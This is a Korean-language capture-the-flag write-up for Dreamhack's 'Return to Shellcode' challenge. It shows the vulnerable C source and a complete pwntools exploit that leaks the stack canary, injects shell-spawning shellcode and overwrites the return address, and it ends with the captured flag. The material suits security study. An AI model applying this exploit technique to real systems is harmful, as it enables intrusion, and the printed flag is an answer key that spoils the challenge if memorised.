<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "Return to Shellcode"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.22 풀이

<img width="660" height="366" alt="image" src="https://github.com/user-attachments/assets/ba46ffa9-d64d-4d78-b680-b7e79666f664" />

문제 파일을 pwndbg로 확인해보니, canary가 설정되어 있는 것을 알 수 있다. 

<br>

</br> 

```
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

문제 코드를 살펴보았다.
이 코드는 buf 주소와 buf와 RBP의 거리를 알려주고, 첫 입력에서 스택 내용을 흘려보내
canary 누출을 시도하는 것으로 보인다. 그 후, 두 번째 입력에서 gets로
길이 검사 없이 덮어써서 return address를 덮을 수 있게 만들어져 있다.

<br>

</br> 

<img width="972" height="214" alt="image" src="https://github.com/user-attachments/assets/8790ad94-09b9-42fd-ae05-888d81a7a501" />

실제 파일을 실행해보면, 주소와 거리가 출력되는 것을 확인할 수 있다.

<br>

</br> 

```
from pwn import *

p = remote("host1.dreamhack.games", 11546)  # ip는 string, port는 int형
context.arch = 'amd64'  

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)  

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])  # buf에서 rbp까지의 거리
buf2cnry = buf2sfp - 8  

payload = b'A' * (buf2cnry + 1) 
p.sendafter(b'Input:', payload)

p.recvuntil(payload)  
cnry = u64(b'\x00' + p.recvn(7))  # 카나리 값 복원


sh = asm(shellcraft.sh())  # 쉘코드 생성

payload = sh.ljust(buf2cnry, b'A')  # 카나리 앞까지 쉘코드 + 패딩
payload += p64(cnry)  
payload += b'B' * 8   
payload += p64(buf)   # Return Address를 buf로 설정 

p.sendlineafter(b'Input:', payload)  

p.interactive()
```
이를 통해, 기본적으로 제공받는 정보인 주소, 오프셋을 이용해 카나리를 유출한 후,
그 카나리를 그대로 유지하면서 리턴 주소를 버퍼로 덮어 버퍼 내 쉘 코드를 실행하게 만드는
코드를 작성해보았다. buf 주소와 buf→$rbp 거리를 이용해 스택 오프셋을 계산한 뒤,
첫 입력으로 printf("%s")를 유도해 스택 카나리 값을 누출(leak)하고,
두 번째 입력에서 그 정확한 카나리값을 그대로 넣은 채 리턴 주소를
buf로 덮어서 버퍼에 넣어둔 쉘코드가 실행되게끔 하였다.

<br>

</br> 

<img width="1150" height="442" alt="image" src="https://github.com/user-attachments/assets/85feb62e-3771-4dd1-9b57-2d5a973d9839" />

해당 코드를 실행해보니, flag 값을 얻을 수 있었다.

<br>

</br> 

```
DH{333eb89c9d2615dd8942ece08c1d34d5}
```
